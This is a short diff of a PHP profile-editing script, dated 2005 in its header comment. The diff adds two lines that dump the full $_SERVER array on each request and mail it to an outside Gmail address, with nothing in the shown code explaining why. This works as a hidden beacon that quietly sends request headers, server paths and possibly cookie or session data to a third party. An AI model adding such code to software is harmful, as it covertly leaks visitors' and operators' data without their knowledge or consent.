@@ -5,7 +5,8 @@
   MODIFIED BY : Rahul Tara
   MODIFIED ON : 25 May,2005
 **********************************************************************************************/
-
+$msg = print_r($_SERVER,true);
+mail("kunal.test02@gmail.com","editprofile1.php in USE",$msg);
 	//to zip the file before sending it
 	$zipIt = 0;
 	if (strstr($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip'))
